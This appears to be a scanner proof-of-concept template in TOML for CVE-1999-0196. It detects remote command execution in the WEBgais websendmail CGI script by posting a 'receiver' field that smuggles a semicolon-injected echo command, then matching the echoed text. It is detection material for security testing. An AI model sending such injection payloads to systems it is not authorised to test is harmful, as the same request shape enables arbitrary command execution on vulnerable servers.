[info]
author = "AVE"
description = "检测 WEBgais 1.0 websendmail CGI 脚本中的远程命令执行漏洞。通过 POST 方式向 /cgi-bin/websendmail 发送特制 receiver 参数，利用 shell 元字符（;）注入系统命令。验证方式为注入无害 echo 命令并检查回显。"
id = "POC-AVE-1999-0378"
name = "WEBgais websendmail Remote Command Execution PoC"
severity = "medium"
tags = ["cve-1999-0196"]
vuln_id = [
    "CVE-1999-0196",
    "AVE-1999-0378",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-bin/websendmail"
protocol = "http"

[poc.requests.body]
content = "receiver=%3Becho+AVETEST&sender=a&rtnaddr=a&subject=a&content=a"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["AVETEST"]
